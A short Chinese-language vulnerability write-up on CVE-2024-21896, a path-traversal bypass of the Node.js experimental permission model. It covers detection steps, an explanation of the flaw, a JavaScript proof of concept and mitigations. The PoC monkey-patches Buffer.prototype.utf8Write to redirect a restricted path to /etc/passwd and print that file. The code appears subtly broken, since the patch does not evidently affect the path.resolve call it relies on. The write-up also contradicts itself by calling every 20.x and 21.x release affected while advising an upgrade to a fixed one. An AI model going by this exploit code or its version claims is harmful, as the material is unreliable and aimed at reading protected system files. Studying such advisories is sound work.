验证漏洞存在方法
    - 检查Node.js版本是否为20.x或21.x
    - 确认实验性权限模型已启用
    - 尝试通过monkey-patching Buffer.prototype.utf8Write来绕过路径解析保护

漏洞利用方法
    - 该漏洞存在于Node.js的实验性权限模型中，当路径被当作Buffer处理时，通过修改Buffer.prototype.utf8Write可以影响path.resolve()的结果
    - 攻击者可以通过monkey-patching Buffer内部机制来修改路径解析结果，从而实现路径遍历攻击
    - 此漏洞允许攻击者绕过权限模型的路径保护机制，访问本应受限制的文件系统路径

PoC示例代码：
```javascript
// CVE-2024-21896 PoC概念验证
// 注意：此代码仅用于演示漏洞原理，实际利用需要特定环境配置

const fs = require('fs');
const path = require('path');

// 保存原始的utf8Write方法
const originalUtf8Write = Buffer.prototype.utf8Write;

// Monkey-patch Buffer.prototype.utf8Write
Buffer.prototype.utf8Write = function(string, offset, length) {
    // 检测到路径解析相关的字符串时进行修改
    if (string.includes('/restricted/path')) {
        // 将受限路径修改为恶意路径
        string = string.replace('/restricted/path', '/etc/passwd');
    }
    return originalUtf8Write.call(this, string, offset, length);
};

// 在权限模型下尝试访问受限路径
try {
    // 模拟权限模型的路径检查
    const userPath = '/restricted/path';
    const resolvedPath = path.resolve(userPath);
    
    console.log('原始路径:', userPath);
    console.log('解析后路径:', resolvedPath);
    
    // 由于Buffer转换被篡改，实际可能访问到/etc/passwd
    const content = fs.readFileSync(resolvedPath, 'utf8');
    console.log('文件内容:', content.substring(0, 100));
} catch (error) {
    console.error('错误:', error.message);
} finally {
    // 恢复原始方法
    Buffer.prototype.utf8Write = originalUtf8Write;
}
```

影响版本：
- Node.js 20.x 所有版本
- Node.js 21.x 所有版本

缓解措施：
1. 避免在生产环境中使用实验性权限模型
2. 升级到已修复的Node.js版本
3. 监控和限制对Buffer.prototype等核心对象的修改
